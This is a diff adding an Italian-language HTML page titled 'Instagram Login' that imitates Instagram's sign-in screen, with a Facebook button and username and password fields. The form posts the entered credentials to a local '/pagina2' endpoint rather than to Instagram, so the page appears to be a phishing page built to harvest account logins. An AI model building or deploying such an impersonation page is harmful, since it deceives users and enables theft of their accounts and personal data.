@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+        }
+        .login-container {
+            background: white;
+            padding: 20px;
+            border: 1px solid #dbdbdb;
+            text-align: center;
+            width: 350px;
+            border-radius: 8px;
+        }
+        .instagram-logo {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-size: 32px;
+            font-weight: bold;
+            color: black;
+            text-align: center;
+            margin-bottom: 20px;
+            font-style: italic;
+        }
+        .facebook-login {
+            width: 100%;
+            background-color: #1877f2;
+            color: white;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 10px;
+        }
+        .facebook-login img {
+            width: 20px;
+            margin-right: 8px;
+        }
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 10px 0;
+        }
+        .divider::before, .divider::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background: #dbdbdb;
+        }
+        .divider span {
+            padding: 0 10px;
+            color: #8e8e8e;
+            font-weight: bold;
+        }
+        .input-field {
+            width: 100%;
+            padding: 10px;
+            margin: 5px 0;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            outline: none;
+            background-color: #fafafa;
+        }
+        .login-button {
+            width: 100%;
+            background-color: #0095f6;
+            color: white;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            margin-top: 10px;
+        }
+        .forgot-pass {
+            margin-top: 10px;
+            font-size: 12px;
+            color: #385185;
+            cursor: pointer;
+        }
+        .signup-link {
+            margin-top: 10px;
+            font-size: 14px;
+        }
+        .signup-link a {
+            color: #0095f6;
+            text-decoration: none;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <h1 class="instagram-logo">Instagram</h1>
+        <button class="facebook-login">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook">
+            Continua con Facebook
+        </button>
+        <div class="divider"><span>o</span></div>
+        <form action="/pagina2" method="post">
+            <input type="text" class="input-field" name="username" placeholder="Numero di telefono, nome utente o e-mail" required>
+            <input type="password" class="input-field" name="password" placeholder="Password" required>
+            <p class="forgot-pass">Password dimenticata?</p>
+            <button type="submit" class="login-button">Accedi</button>
+        </form>
+    </div>
+    <p class="signup-link">Non hai un account? <a href="#">Iscriviti</a></p>
+</body>
+</html>
